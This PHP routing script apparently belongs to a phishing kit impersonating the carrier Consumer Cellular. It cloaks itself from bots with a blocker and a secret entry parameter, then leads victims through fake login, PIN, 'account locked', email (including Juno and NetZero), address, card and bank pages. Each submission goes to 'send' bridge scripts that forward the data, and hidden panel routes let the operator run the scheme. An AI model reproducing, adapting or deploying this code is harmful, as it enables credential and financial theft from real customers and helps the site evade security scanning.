<?php

require_once __DIR__ . '/../blocker/karma_blocker.php';
require_once __DIR__ . '/functions.php';
karma_blocker();

$config = require __DIR__ . '/../config/config.php';
require_once __DIR__ . '/rules.php';

$requestUri = $_SERVER['REQUEST_URI'];
$parsedUrl = parse_url($requestUri);
parse_str($parsedUrl['query'] ?? '', $queryParams);

$path = $parsedUrl['path'] ?? '/';

if ($path === '/' || $path === '/index.php') {
    if (isset($queryParams[$config['parameter']])) {
        $_SESSION['karma'] = true;
        log_event('VISIT');
        header('Location: /consumercellular.com/login');
        exit;
    } else {
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
}

if (strpos($parsedUrl['path'], '/consumercellular.com/login') === 0) {
    $_SESSION['karma'] = true;
    if (empty($_SESSION['karma'])) {
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/cs.php';
    LoginPage();
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/pin') === 0) {
    $_SESSION['karma'] = true;
    if (empty($_SESSION['karma'])) {
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/cs.php';
    PinPage();
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/locked') === 0) {
    $_SESSION['karma'] = true;
    if (empty($_SESSION['karma'])) {
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/cs.php';
    LockedPage();
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/email') === 0) {
    $_SESSION['karma'] = true;
    if (empty($_SESSION['karma'])) {
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/cs.php';
    EmailPage();
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/address') === 0) {
    $_SESSION['karma'] = true;
    if (empty($_SESSION['karma'])) {
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/cs.php';
    AddressPage();
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/cards') === 0) {
    $_SESSION['karma'] = true;
    if (empty($_SESSION['karma'])) {
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/cs.php';
    CardPage();
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/bank') === 0) {
    $_SESSION['karma'] = true;
    if (empty($_SESSION['karma'])) {
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/cs.php';
    BankPage();
    exit;
}

if (strpos($parsedUrl['path'], '/juno') === 0) {
    if (empty($_SESSION['karma'])) {
        log_event('BOT');
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/emails.php';
    JunoPage();
    exit;
}

if (strpos($parsedUrl['path'], '/netzero') === 0) {
    if (empty($_SESSION['karma'])) {
        log_event('BOT');
        header('Location: ' . $config['redirect_bots']);
        exit;
    }
    require_once dirname(__DIR__, 2) . '/pages/emails.php';
    NetzeroPage();
    exit;
}

## JANG POST ##
if (strpos($parsedUrl['path'], '/consumercellular.com/proccess_login') === 0 && $_SERVER['REQUEST_METHOD'] === 'POST') {
    require_once dirname(__DIR__, 2) . '/bridge/send_login.php';
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/proccess_pin') === 0 && $_SERVER['REQUEST_METHOD'] === 'POST') {
    require_once dirname(__DIR__, 2) . '/bridge/send_pin.php';
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/proccess_email') === 0 && $_SERVER['REQUEST_METHOD'] === 'POST') {
    require_once dirname(__DIR__, 2) . '/bridge/send_emails.php';
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/proccess_address') === 0 && $_SERVER['REQUEST_METHOD'] === 'POST') {
    require_once dirname(__DIR__, 2) . '/bridge/send_address.php';
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/proccess_card') === 0 && $_SERVER['REQUEST_METHOD'] === 'POST') {
    require_once dirname(__DIR__, 2) . '/bridge/send_card.php';
    exit;
}

if (strpos($parsedUrl['path'], '/consumercellular.com/proccess_bank') === 0 && $_SERVER['REQUEST_METHOD'] === 'POST') {
    require_once dirname(__DIR__, 2) . '/bridge/send_bank.php';
    exit;
}

## PANEL ##
if (strpos($parsedUrl['path'], '/karmaxcs') === 0) {
    require_once dirname(__DIR__, 1) . '/pages/panel.php';
    KarmaPanelPage();
    exit;
}

if (strpos($parsedUrl['path'], '/karmaxsettings') === 0) {
    require_once dirname(__DIR__, 1) . '/pages/panel.php';
    KarmaPanelSettingsPage();
    exit;
}

log_event('BOT');
http_response_code(404);
header('Location: ' . $config['redirect_bots']);
exit;
